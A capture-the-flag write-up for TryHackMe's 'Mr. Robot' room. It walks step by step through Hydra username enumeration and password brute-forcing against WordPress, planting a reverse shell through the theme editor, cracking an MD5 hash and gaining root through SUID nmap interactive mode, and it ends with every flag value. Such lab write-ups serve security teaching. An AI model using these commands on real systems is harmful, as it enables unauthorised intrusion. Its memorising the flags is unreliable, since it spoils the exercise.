# TryHackMe — Mr. Robot CTF | Full Writeup

**Room:** <https://tryhackme.com/room/mrrobot>  
**Difficulty:** Medium  
**OS:** Linux

Mr. Robot CTF is a three-key Linux box themed around the TV show. The box ships a WordPress site with a hint file exposed through `robots.txt`, which doubles as a password wordlist. The wordlist is used first to enumerate a valid username against the WordPress login form, then to brute-force that user's password. Admin access to WordPress leads to a PHP reverse shell planted through the theme editor. From there, a world-readable MD5 hash in another user's home directory cracks in seconds, and a SUID-flagged, decade-old copy of `nmap` provides the path to root.

---

## 1. Reconnaissance

```
nmap $IP -p- --open -sV -sC -Pn
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

Both 80 and 443 serve the same Apache instance, no title on either. SSH is open but there are no credentials yet, so the web server is the obvious starting point.

---

## 2. Initial Enumeration — Web Server

```
curl $IP
```

The response is a static page with an ASCII-art banner referencing the show, no obvious links or forms in the source. Next step was the standard `robots.txt` check.

```
curl http://$IP/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two disallowed entries, both directly fetchable:

```
curl http://$IP/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

**Key 1 of 3 found.** `fsocity.dic` is a ~6.9 MB wordlist, unusual for a `robots.txt` entry — the box is hinting that it's meant to be used as a credential list.

```
wget http://$IP/fsocity.dic
```

---

## 3. Username Enumeration — WordPress Login Form

There's no visible link to `/wp-login.php`, but WordPress defaults make it a safe guess. Rather than guessing usernames, `fsocity.dic` was fed into Hydra as the **login list** (`-L`) with a throwaway password, filtering on the form's "Invalid username" error:

```
hydra -L fsocity.dic -p randompassswd $IP \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

```
[80][http-post-form] host: $IP   login: Elliot   password: randompassswd
[80][http-post-form] host: $IP   login: elliot   password: randompassswd
```

Both casings passed the "Invalid username" filter, meaning WordPress accepted `elliot` as a real account — the login form leaks valid usernames through its error message, independent of the password.

---

## 4. Password Brute Force — WordPress Login

With a confirmed username, the same wordlist was pointed at the password field instead, this time filtering on the password-specific error:

```
hydra -l Elliot -P fsocity.dic $IP \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered" -t 54
```

**Password found:** `ER28-0652`

Logging in at `/wp-login.php` with `elliot:ER28-0652` succeeded. The dashboard identified the install as **WordPress 4.3.1** running the **Twenty Fifteen** theme.

---

## 5. Initial Shell — WordPress Theme Editor

WordPress admins can edit theme files directly from **Appearance → Editor**, and saved changes are written straight to disk with no upload or file-type checks — an old but reliable way to get code execution once you have admin credentials.

A PHP reverse shell (the standard pentestmonkey payload) was pasted into `archive.php` of the active theme and saved:

```
http://$IP/wp-content/themes/twentyfifteen/archive.php
```

Listener set up on the attacker box:

```
nc -lvnp 4445
```

Visiting `archive.php` in the browser triggered the payload:

```
connect to [$IP] from (UNKNOWN) [$IP] 37826
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Shell landed as `daemon`. Upgraded to a full TTY:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 6. Post-Exploitation — Pivoting to robot

```
ls -la /home
```

```
drwxr-xr-x  2 root   root   4096 Nov 13  2015 robot
drwxr-xr-x  4 ubuntu ubuntu 4096 Jun  2  2025 ubuntu
```

Inside `/home/robot`:

```
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

`key-2-of-3.txt` is only readable by `robot`, but `password.raw-md5` is world-readable:

```
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

A plain MD5 hash with no salt cracks fast. It was run through [crackstation.net](https://crackstation.net/), which resolved it to `abcdefghijklmnopqrstuvwxyz`.

```
su robot
Password: abcdefghijklmnopqrstuvwxyz
```

```
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

**Key 2 of 3 found.**

---

## 7. Privilege Escalation — SUID nmap Interactive Mode

```
find / -type f -perm -04000 2>/dev/null
```

Most entries are standard system binaries (`su`, `sudo`, `passwd`, ...), but one stands out:

```
-rwsr-xr-x 1 root root 17272 Jun  2  2025 /usr/local/bin/nmap
```

`nmap` is not normally SUID, and this copy is ancient:

```
/usr/local/bin/nmap --version
Starting nmap V. 3.81
```

Nmap 3.81 still ships an **interactive mode**, a legacy feature that was later dropped precisely because it allowed arbitrary command execution — a classic GTFOBins-style privesc when the binary is SUID root.

```
/usr/local/bin/nmap --interactive
nmap> !sh
```

```
whoami
root
```

```
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

**Key 3 of 3 found — root.**

---

## Attack Chain

```
nmap ($IP → ports 22, 80, 443)
  └─→ curl / → Mr. Robot themed static page
        └─→ robots.txt → fsocity.dic + key-1-of-3.txt
              └─→ key-1-of-3.txt (direct read)
              └─→ fsocity.dic used as Hydra login list → username "elliot" confirmed
                    └─→ fsocity.dic used as Hydra password list → ER28-0652
                          └─→ wp-login.php (elliot:ER28-0652) → wp-admin
                                └─→ Theme Editor → archive.php reverse shell
                                      └─→ shell as daemon
                                            └─→ /home/robot/password.raw-md5 (world-readable)
                                                  └─→ MD5 crack (crackstation) → robot's password
                                                        └─→ su robot → key-2-of-3.txt
                                                              └─→ SUID /usr/local/bin/nmap 3.81
                                                                    └─→ interactive mode !sh → root
                                                                          └─→ key-3-of-3.txt
```

---

## Key Concepts

| Concept | Explanation |
|---|---|
| **robots.txt as a hint file** | Disallow entries aren't access control, they're a list of paths the site owner doesn't want indexed by search engines. Anyone can request them directly, and CTF authors frequently use the file to point at wordlists or first flags. |
| **Login-form username enumeration** | When a login form returns a different error for "user doesn't exist" versus "wrong password," the form leaks valid usernames to anyone willing to script a request loop against it, regardless of how strong the passwords are. |
| **WordPress Theme Editor RCE** | Any admin account can edit PHP theme files from the dashboard, and the change is saved straight to the live filesystem. This turns admin-panel access into code execution without needing a separate file-upload vulnerability. |
| **World-readable credential files** | `password.raw-md5` being readable by any local user defeats the purpose of the file permissions on `key-2-of-3.txt` sitting right next to it — the weakest file in a directory sets the real security boundary. |
| **Unsalted MD5** | MD5 with no salt is fast to brute-force and often already sitting in public rainbow-table databases like CrackStation, so cracking it is closer to a lookup than an actual attack. |
| **SUID + legacy interactive mode** | Setting the SUID bit on a binary that was never meant to run as root turns any command-execution feature inside that binary into a root shell. Nmap's old interactive mode is a textbook example, which is exactly why it was removed in later versions. |

---

## Flags

| Flag | Path | Value |
|---|---|---|
| key-1-of-3.txt | `/key-1-of-3.txt` (web root) | `073403c8a58a1f80d943455fb30724b9` |
| key-2-of-3.txt | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| key-3-of-3.txt | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |
